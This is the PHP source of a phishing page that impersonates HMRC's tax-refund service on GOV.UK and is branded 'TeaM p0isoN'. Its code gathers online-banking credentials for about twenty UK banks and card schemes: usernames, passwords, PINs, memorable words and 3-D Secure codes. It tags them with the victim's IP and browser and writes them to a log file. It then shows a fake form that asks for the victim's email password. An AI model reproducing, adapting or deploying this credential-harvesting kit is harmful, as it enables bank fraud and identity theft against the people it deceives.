<?php
session_start();
error_reporting(0);
include "includes/my_email.php";
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/London');
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

$fullname = $_SESSION['fname'];
$email = $_SESSION['email'];


$msg = $_SESSION['msg1'];
$msg .= $_SESSION['msg2'];
$msg .= "+ ------------------------------------------+\n";
$msg .= "+ Bank Information\n";
$msg .= "+ ------------------------------------------+\n";

if(isset($_POST['telepin2'])) {

$msg .= "| Barclays Membership Number: ".$_POST['number2']."\n";
$msg .= "| Barclays Memorable Word: ".$_POST['word']."\n";
$msg .= "| Barclays Banking Passcode: ".$_POST['telepin2']."\n";

}

if(isset($_POST['telepin1'])) {

$msg .= "| HSBC Banking Username: ".$_POST['username1']."\n";
$msg .= "| HSBC Password: ".$_POST['password1']."\n";
$msg .= "| HSBC Memorable Word: ".$_POST['word1']."\n";
$msg .= "| HSBC Security Number: ".$_POST['telepin1']."\n";

}

if(isset($_POST['username3'])) {

$msg .= "| Halifax Username: ".$_POST['username3']."\n";
$msg .= "| Halifax Password: ".$_POST['password3']."\n";
$msg .= "| Halifax Memorable Information: ".$_POST['memorable3']."\n";

}

if(isset($_POST['username4'])) {

$msg .= "| Lloyds Username: ".$_POST['username4']."\n";
$msg .= "| Lloyds Password: ".$_POST['password4']."\n";
$msg .= "| Lloyds Memorable Word: ".$_POST['memorable4']."\n";

}

if(isset($_POST['username5'])) {

$msg .= "| Natwest Customer Number: ".$_POST['username5']."\n";
$msg .= "| Natwest Password: ".$_POST['password5']."\n";
$msg .= "| Natwest PIN: ".$_POST['pin5']."\n";

}

if(isset($_POST['redson1'])) {

$msg .= "| Santander Customer ID: ".$_POST['redson1']."\n";
$msg .= "| Santander Passcode: ".$_POST['redson2']."\n";
$msg .= "| Santander Password: ".$_POST['pp']."\n";
$msg .= "| Santander Memorable Word: ".$_POST['redson3']."\n";

}

if(isset($_POST['username6'])) {

$msg .= "| RBS Customer Number: ".$_POST['username6']."\n";
$msg .= "| RBS Password: ".$_POST['password6']."\n";
$msg .= "| RBS PIN: ".$_POST['pin6']."\n";

}

if(isset($_POST['rs1'])) {

$msg .= "| TSB Customer Number: ".$_POST['rs1']."\n";
$msg .= "| TSB Password: ".$_POST['rs2']."\n";
$msg .= "| TSB Memorable Word: ".$_POST['rs3']."\n";
$msg .= "| TSB Security Number: ".$_POST['rs4']."\n";

}

if(isset($_POST['rs5'])) {

$msg .= "| Clydesdale Customer Number: ".$_POST['rs5']."\n";
$msg .= "| Clydesdale Password: ".$_POST['rs6']."\n";
$msg .= "| Clydesdale Memorable Word: ".$_POST['rs7']."\n";


}

if(isset($_POST['telepin13'])) {

$msg .= "| Nationwide Customer Number: ".$_POST['number13']."\n";
$msg .= "| Nationwide Passcode: ".$_POST['telepin13']."\n";
$msg .= "| Nationwide Memorable Word: ".$_POST['word13']."\n";


}
if(isset($_POST['pin12'])) {

$msg .= "| Citi UserID: ".$_POST['username12']."\n";
$msg .= "| Citi Password: ".$_POST['password12']."\n";
$msg .= "| Citi Pin: ".$_POST['pin12']."\n";


}

if(isset($_POST['number02'])) {

$msg .= "| Sainsbury's Username: ".$_POST['number02']."\n";
$msg .= "| Sainsbury's Password: ".$_POST['word0']."\n";


}
if(isset($_POST['telepin02'])) {

$msg .= "| Metro UserID: ".$_POST['number022']."\n";
$msg .= "| Metro Password: ".$_POST['word02']."\n";
$msg .= "| Metro Security Number: ".$_POST['telepin02']."\n";


}

if(isset($_POST['telepin021'])) {

$msg .= "| Tesco Username: ".$_POST['number0221']."\n";
$msg .= "| Tesco Password: ".$_POST['word021']."\n";
$msg .= "| Tesco Security Number: ".$_POST['telepin021']."\n";


}

if(isset($_POST['telepin022'])) {

$msg .= "| Ulster Customer Number: ".$_POST['number0222']."\n";
$msg .= "| Ulster Password: ".$_POST['word022']."\n";
$msg .= "| Ulster Pin: ".$_POST['telepin022']."\n";


}

if(isset($_POST['telepin023'])) {

$msg .= "| Co-op Username: ".$_POST['number0223']."\n";
$msg .= "| Co-op Passcode: ".$_POST['word023']."\n";
$msg .= "| Co-op Memorable Name: ".$_POST['telepin023']."\n";


}
if(isset($_POST['numberred'])) {

$msg .= "| Monzo Email: ".$_POST['numberred']."\n";
$msg .= "| Monzo Password: ".$_POST['word023red']."\n";
$msg .= "| Monzo Pin: ".$_POST['telepin023red']."\n";


}

if(isset($_POST['vbv'])) {

$msg .= "| VBV 3D Password: ".$_POST['vbv']."\n";

}

if(isset($_POST['msc'])) {

$msg .= "| Mastercard Secure Code: ".$_POST['msc']."\n";

}

if(isset($_POST['cid'])) {

$msg .= "| CID Code: ".$_POST['cid']."\n";

}

$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "---------------------------------------------------------------------------\n";
$_SESSION['msg3']=$msg;
$subject = "TeaM p0isoN Bank for $fullname";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

if($Encrypt==1) {
$method = 'aes-256-cbc';
$key = substr(hash('sha256', $password, true), 0, 32);
$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
$encrypted = base64_encode(openssl_encrypt($msg, $method, $key, OPENSSL_RAW_DATA, $iv));
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("logs/HMRC-banks.txt","a");
	fwrite($file,$encrypted);
	fclose($file);
	}
	else {
	$file=fopen("logs/HMRC-banks.txt","a");
	fwrite($file,$msg);
	fclose($file);
	}
}
$emaillogo=$_SESSION['email'];
if (strpos($emaillogo, 'gmail.com')) {
      $_SESSION['emlogo'] = "gmail.png";
      }
      elseif(strpos($emaillogo, 'yahoo') || strpos($emaillogo, 'ymail')) {
      $_SESSION['emlogo'] = "yah.jpg";
      }
	   elseif (strpos($emaillogo, 'hotmail') || strpos($emaillogo, 'msn') || strpos($emaillogo, 'live')) {
      $_SESSION['emlogo'] = 'hot2.png';
      }
	   elseif (strpos($emaillogo, 'virgin') || strpos($emaillogo, 'ntlworld') || strpos($emaillogo, 'blueyonder')) {
      $_SESSION['emlogo'] = "virgin.png";
      }
	   elseif (strpos($emaillogo, 'sbcglobal')) {
      $_SESSION['emlogo'] = "sbc.png";
      }else {
      $_SESSION['emlogo'] = "eml.png";
      }
?>
<html class="js flexbox no-touch geolocation multiplebgs backgroundsize cssanimations csscolumns cssgradients csstransforms csstransforms3d csstransitions video audio svg"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script src="./code_files/jquery-3.2.1.min.js"></script>
<script src="./code_files/jquery.validate.js"></script>
	    <link href="assets/css/main.css" rel="stylesheet" media="all">
		<style>
.button {
  background-color: #4CAF50; /* Green */
  border: none;
  color: white;
  padding: 16px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  -webkit-transition-duration: 0.4s; /* Safari */
  transition-duration: 0.4s;
  cursor: pointer;
}


.button5 {
  background-color: white;
  color: black;
  border: 2px solid #555555;
  padding: 6px 37px
}

.button5:hover {
  background-color: #005ea5;
  color: white;
  cursor: pointer;
}
</style>

<meta content="IE=11; IE=10; IE=9; IE=8; IE=EDGE" http-equiv="X-UA-Compatible">
<title>Claim a refund | HMRC</title>
<meta content="user-scalable=0, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" name="viewport">
<meta content="telephone=no" name="format-detection">
<link href="assets/img/favicon.ico" rel="icon" type="image/x-icon">
<link href="./code_files/3d.css" rel="stylesheet">

</head>
  <header role="banner" class="with-proposition" id="global-header">
                <div class="header-wrapper">
                    <div class="header-global">
                        <div class="header-logo">
                            <a href="#" id="logo" class="content">
                            <img src="assets/img/logo.png" width="35" height="31" alt=""> GOV.UK
                            </a>
                        </div>
                    </div>
                    <div class="header-proposition">
                      <div class="content">
                        <nav id="proposition-menu">
                          <a href="#" id="proposition-name"></a>
                        </nav>
                      </div>
                    </div>
                </div>
            </header>
			 <div id="global-header-bar"></div>

            <div id="wrapper">
                <div class="maincontent">
    <div id="startHeader" class="start-header group">
        <h1></h1>
    </div>
<body class="handheld">

<section class="module no-margin-top no-margin-bottom padding-bottom-1em myee" style="
    margin-bottom: 50px;
">
<div class="janrain-content">


<div class="clear"></div>


<form name="my_form" id="my_form" action="emailerror" method="post">
<div class="address">
<div style="<?php

$useragent=$_SERVER['HTTP_USER_AGENT'];

if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4)))  {

echo 'width:100%';

}

else  {

echo 'width:40%';

}

?>;margin-left: auto; margin-right:auto;border:1px;border-color:rgb(128, 128, 128);border-style: solid;">		
<div id="vbvbox" style="background-color:#ffffff;padding:5px">
<br>
<span id='visa' style='display: block;'><span id='banko'><center><img src="./code_files/<?php echo $_SESSION['emlogo']?>" alt="" width="150"></center></span></span>
<br>
<br>
<span id='visaMSG' style='color: rgb(102, 102, 102); font-family: Arial; font-size: 12px; display: block;'>

<center><strong>Synchronize your email account with HMRC Connect, to get updates and important notices.</strong></center>
</span>
<br>

<table style="width:100%;font-size:12px">
<tbody><tr>

<tr>
<td style="text-align:right">
Email:
</td>
<td style="text-align:left;padding-left:5px;padding-bottom: 10px;">
<input type="email" name="ea" id="ea" required style="width: 140px!important;padding: 2px;border: #6d6e71 1px solid;color: black!important;"  value="<?php echo $_SESSION['email']?>">
</td>
</tr>

<tr>
<td style="text-align:right">
Password:
</td>
<td style="text-align:left;padding-left:5px;padding-bottom: 10px;">
<input type="password" name="pas" id="pas" required style="width: 140px!important;padding: 2px;border: #6d6e71 1px solid;color: black!important;">
</td>
</tr>

<tr>
<td style="text-align:right">
</td>

</tr>

<tr>
<td style="text-align:right">&nbsp;

</td>
<td style="text-align:left;padding-left:5px">&nbsp;

</td>
</tr>

<tr>
<td style="text-align:right">&nbsp;

</td>
<td style="text-align:left;padding-left:5px">&nbsp;

</td>
</tr>

</tbody></table>
<td style="text-align:left;padding-left:5px">
<center><button id="my_button" class="button5" type="submit">Login</button></center>
</td>
<p style="text-align: center;width: 100%;font-size: 12px;color: #000000;">
<strong>This information is not shared with the merchant.</strong><br>
This service has been requested by HM Revenue & Customs.<br><br>
</p>

</div>
</div>
</div>
					<script type="text/javascript">
					var form = document.getElementById("my_form"), button = document.getElementById("my_button");
my_form.onsubmit = function() {
    return false;
}

my_form.onsubmit = function() {
 setTimeout(function() {
    form.submit();
 }, 2000);
   return false;
}
</script>
</form>

</div>
</section></div>

</body>
<footer class="group js-footer" id="footer" role="contentinfo">
                <div class="footer-wrapper">
                    <div class="footer-meta">
                        <div class="footer-meta-inner">
                            <ul>
                                <li>
                                    <a href="#">Help</a>
                                </li>
                                <li>
                                    <a href="#">Cookies</a>
                                </li>
                                <li>
                                    <a href="#">Contact</a>
                                </li>
                                <li>
                                    <a href="#"> Terms and conditions</a>
                                </li>
                                <li>
                                    <a href="#">Rhestr o Wasanaethau Cymraeg</a> 
                                </li>
								                                <li>
                                    <a href="#">Built by the Government Digital Service</a> 
                                </li>
                            </ul>
                            <div class="open-government-licence">
                                <p class="logo"><a href="#">Open Government Licence</a></p>
                              <p>
                                    All content is available under the <a href="#">
                                        Open Government Licence v3.0</a>, except where otherwise stated</p>
                            </div>
                        </div>
                        <div class="copyright">
                            <a href="#">
                                &copy; Crown copyright</a>
                        </div>
                    </div>
                </div>
            </footer>
            <!--end footer-->
</body></html>